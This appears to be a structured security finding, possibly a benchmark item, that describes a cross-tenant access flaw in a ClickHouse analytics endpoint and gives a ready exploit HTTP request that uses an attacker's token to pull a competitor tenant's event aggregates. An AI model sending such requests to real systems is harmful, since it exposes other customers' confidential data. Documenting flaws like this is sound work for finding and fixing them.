diagnosis: The ClickHouse event aggregation endpoint accepts tenant_id directly in the JSON request body and filters ClickHouse telemetry data using that parameter. Although the route requires an authenticated user, it never validates that query.tenant_id matches user.tenant_id, allowing any tenant to query aggregates and performance metrics of competitor tenants.
exploit_request:
POST /analytics/events/aggregate HTTP/1.1
Host: analytics.telemetry-db.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"tenant_id": "tenant_enterprise_competitor", "event_type": "checkout_completed", "date_from": "2026-08-01", "date_to": "2026-08-31"}
